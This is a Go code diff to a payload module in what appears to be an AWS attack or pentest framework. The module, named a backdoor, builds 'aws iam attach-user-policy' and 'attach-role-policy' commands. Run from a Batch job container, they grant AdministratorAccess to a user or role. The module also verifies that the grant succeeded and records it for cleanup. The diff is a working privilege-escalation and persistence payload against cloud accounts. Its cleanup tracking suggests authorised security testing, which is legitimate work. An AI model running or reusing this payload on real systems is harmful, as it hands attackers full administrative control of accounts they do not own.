@@ -16,11 +16,12 @@ import (
 )
 
 // BackdoorAttachPolicyPayload generates a bash command that attaches a managed policy
-// to an IAM user. The command runs inside the Batch job container, which executes
+// to an IAM user or role. The command runs inside the Batch job container, which executes
 // with the jobRoleArn's credentials from the pre-existing job definition.
 //
-// Modules pass this command to ContainerOverrides.Command via ["sh", "-c", code] so
-// the shell evaluates the full AWS CLI invocation.
+// TARGET_PRINCIPAL is not required here — batch modules resolve it from the current
+// caller identity via STS GetCallerIdentity before calling Validate()/GenerateCode().
+// PRINCIPAL_TYPE ("user" or "role") controls which IAM attach command is emitted.
 type BackdoorAttachPolicyPayload struct{}
 
 func init() {
@@ -32,7 +33,7 @@ func (p *BackdoorAttachPolicyPayload) GetName() string {
 }
 
 func (p *BackdoorAttachPolicyPayload) GetDescription() string {
-	return "Attach AdministratorAccess (or any managed policy) to an IAM user via Batch job container command"
+	return "Attach AdministratorAccess (or any managed policy) to an IAM user or role via Batch job container command"
 }
 
 func (p *BackdoorAttachPolicyPayload) GetTags() []string {
@@ -46,9 +47,17 @@ func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "TARGET_USER",
-			Description: "IAM username to attach the policy to (auto-resolved from caller identity if not set)",
-			Required:    true,
+			Name:        "TARGET_PRINCIPAL",
+			Description: "IAM username or role name to attach the policy to (auto-resolved from caller identity if not set)",
+			Required:    false,
+		},
+		{
+			// Set by the module when it resolves the principal from the caller ARN.
+			// "user" → attach-user-policy; "role" → attach-role-policy.
+			Name:        "PRINCIPAL_TYPE",
+			Description: "Principal type: 'user' or 'role' (auto-resolved from caller identity if not set)",
+			Required:    false,
+			Default:     "user",
 		},
 		{
 			Name:        "POLICY_ARN",
@@ -60,48 +69,85 @@ func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 }
 
 func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
-	if options["TARGET_USER"] == "" {
-		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
+	// TARGET_PRINCIPAL is resolved by the module before Validate() is called.
+	// If still empty at this point, the module failed to resolve it and will have
+	// already returned an error — so we surface a clear message here as a fallback.
+	if options["TARGET_PRINCIPAL"] == "" {
+		return fmt.Errorf("TARGET_PRINCIPAL is required; set it explicitly or ensure the current identity is an IAM user or role")
+	}
+	principalType := options["PRINCIPAL_TYPE"]
+	if principalType != "" && principalType != "user" && principalType != "role" {
+		return fmt.Errorf("PRINCIPAL_TYPE must be 'user' or 'role', got '%s'", principalType)
 	}
 	return nil
 }
 
-// GenerateCode returns a bash one-liner that attaches the policy.
-// The module wraps this as either direct args (aws-cli container mode) or
-// ["sh", "-c", code] (generic Linux container mode) depending on CONTAINER_RUNTIME.
+// GenerateCode returns a bash one-liner that attaches the policy to the target principal.
+// The command differs for users vs roles:
+//
+//	user: aws iam attach-user-policy --user-name NAME --policy-arn ARN
+//	role: aws iam attach-role-policy --role-name NAME --policy-arn ARN
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
-	targetUser := options["TARGET_USER"]
+	targetPrincipal := options["TARGET_PRINCIPAL"]
+	principalType := options["PRINCIPAL_TYPE"]
+	if principalType == "" {
+		principalType = "user"
+	}
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	return fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", targetUser, policyArn), nil
+	switch principalType {
+	case "role":
+		return fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", targetPrincipal, policyArn), nil
+	default:
+		return fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", targetPrincipal, policyArn), nil
+	}
 }
 
-// VerifySuccess confirms the policy attachment by listing the user's attached policies.
+// VerifySuccess confirms the policy attachment by listing the principal's attached policies.
 func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
-	targetUser := options["TARGET_USER"]
+	targetPrincipal := options["TARGET_PRINCIPAL"]
+	principalType := options["PRINCIPAL_TYPE"]
+	if principalType == "" {
+		principalType = "user"
+	}
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	if targetUser == "" {
-		return false, fmt.Errorf("TARGET_USER not set; cannot verify")
+	if targetPrincipal == "" {
+		return false, fmt.Errorf("TARGET_PRINCIPAL not set; cannot verify")
 	}
 
 	iamClient := iam.NewFromConfig(config)
-	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
-		UserName: aws.String(targetUser),
-	})
-	if err != nil {
-		return false, nil
-	}
 
-	for _, policy := range result.AttachedPolicies {
-		if aws.ToString(policy.PolicyArn) == policyArn {
-			return true, nil
+	switch principalType {
+	case "role":
+		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
+			RoleName: aws.String(targetPrincipal),
+		})
+		if err != nil {
+			return false, nil
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
+		}
+	default:
+		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
+			UserName: aws.String(targetPrincipal),
+		})
+		if err != nil {
+			return false, nil
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
 		}
 	}
 
@@ -111,7 +157,11 @@ func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config 
 // ReportSideEffects returns the policy attachment as a tracked resource so workspace
 // cleanup can later detach it.
 func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
-	targetUser := options["TARGET_USER"]
+	targetPrincipal := options["TARGET_PRINCIPAL"]
+	principalType := options["PRINCIPAL_TYPE"]
+	if principalType == "" {
+		principalType = "user"
+	}
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -122,15 +172,20 @@ func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]strin
 		policyName = policyArn[idx+1:]
 	}
 
+	cleanupMethod := "iam:DetachUserPolicy"
+	if principalType == "role" {
+		cleanupMethod = "iam:DetachRolePolicy"
+	}
+
 	return []modules.CreatedResource{
 		{
 			Type:          "iam:attached-policy",
-			Name:          fmt.Sprintf("%s←%s", targetUser, policyName),
+			Name:          fmt.Sprintf("%s←%s", targetPrincipal, policyName),
 			ARN:           policyArn,
-			CleanupMethod: "iam:DetachUserPolicy",
+			CleanupMethod: cleanupMethod,
 			Metadata: map[string]string{
-				"principal_type": "user",
-				"principal_name": targetUser,
+				"principal_type": principalType,
+				"principal_name": targetPrincipal,
 				"policy_arn":     policyArn,
 			},
 		},
